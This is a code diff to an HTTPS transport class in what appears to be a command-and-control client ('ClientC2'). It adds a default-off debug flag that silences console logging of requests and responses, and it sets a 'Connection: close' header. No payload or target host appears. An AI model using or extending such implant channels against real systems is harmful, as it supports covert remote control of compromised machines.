@@ -7,11 +7,15 @@ using System.Net.Sockets;
 using System.Security.Authentication;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
+using ClientC2.helpers;
 
 namespace ClientC2.channels
 {
     public class HttpsClient
     {
+        //debug
+        private bool debug = false;
+
         private string ip;
         private int port;
         private string sni;
@@ -28,7 +32,7 @@ namespace ClientC2.channels
                 { "Host", sni },
                 { "Accept", "*/*" },
                 { "Accept-Language", "en" },
-                //{ "Connection", "close" },
+                { "Connection", "close" },             
             };
             this.ValidateCert = ValidateCert;
         }
@@ -110,7 +114,7 @@ namespace ClientC2.channels
 
         private string readResponse(SslStream sslStream)
         {
-            Console.WriteLine("\n\n=============================== HTTP RSP ===============================");
+            if(debug) Console.WriteLine("\n\n=============================== HTTP RSP ===============================");
             bool chunked = false;
             int contentLength = -1;
             string headers = string.Empty;
@@ -121,7 +125,7 @@ namespace ClientC2.channels
                 {
                     string line = readLine(sslStream);
                     headers += line + "\n";
-                    Console.WriteLine(line);
+                    if (debug) Console.WriteLine(line);
                     if (line.ToLower().StartsWith("transfer-encoding") && line.ToLower().Contains("chunked"))
                     {
                         chunked = true;
@@ -139,11 +143,11 @@ namespace ClientC2.channels
                     while (true)
                     {
                         string chunkLenStr = readLine(sslStream);
-                        Console.WriteLine(chunkLenStr);
+                        if (debug) Console.WriteLine(chunkLenStr);
                         int chunkLen = int.Parse(chunkLenStr, System.Globalization.NumberStyles.HexNumber);
                         if (chunkLen == 0) break;
                         byte[] buffer = readFull(sslStream, chunkLen);
-                        Console.WriteLine(Encoding.UTF8.GetString(buffer).TrimEnd('\0'));
+                        if (debug) Console.WriteLine(Encoding.UTF8.GetString(buffer).TrimEnd('\0'));
                         ms.Write(buffer, 0, buffer.Length);
                         readLine(sslStream);
                     }
@@ -153,7 +157,7 @@ namespace ClientC2.channels
                     if (contentLength > 0)
                     {
                         byte[] buffer = readFull(sslStream, contentLength);
-                        Console.WriteLine(Encoding.UTF8.GetString(buffer));
+                        if (debug) Console.WriteLine(Encoding.UTF8.GetString(buffer));
                         ms.Write(buffer, 0, buffer.Length);
                     }
                     else if (contentLength < 0)
@@ -164,7 +168,7 @@ namespace ClientC2.channels
                             int len = sslStream.Read(buffer, 0, buffer.Length);
                             if (len > 0)
                             {
-                                Console.WriteLine(Encoding.UTF8.GetString(buffer).TrimEnd('\0'));
+                                if (debug) Console.WriteLine(Encoding.UTF8.GetString(buffer).TrimEnd('\0'));
                                 ms.Write(buffer, 0, len);
                             }
                             else
@@ -178,7 +182,7 @@ namespace ClientC2.channels
                         return headers;
                     }
                 }
-                Console.WriteLine("\n\n");
+                if (debug) Console.WriteLine("\n\n");
                 return Encoding.UTF8.GetString(ms.ToArray());
             }
         }
@@ -219,9 +223,9 @@ namespace ClientC2.channels
 
         private string send(SslStream sslStream, string httpRequest)
         {
-            Console.WriteLine("\n\n=============================== HTTP REQ ===============================");
-            Console.WriteLine(httpRequest);
-            Console.WriteLine("\n\n");
+            if (debug) Console.WriteLine("\n\n=============================== HTTP REQ ===============================");
+            if (debug) Console.WriteLine(httpRequest);
+            if (debug) Console.WriteLine("\n\n");
             sslStream.Write(Encoding.UTF8.GetBytes(httpRequest));
             sslStream.Flush();
             string rawResponse = readResponse(sslStream);
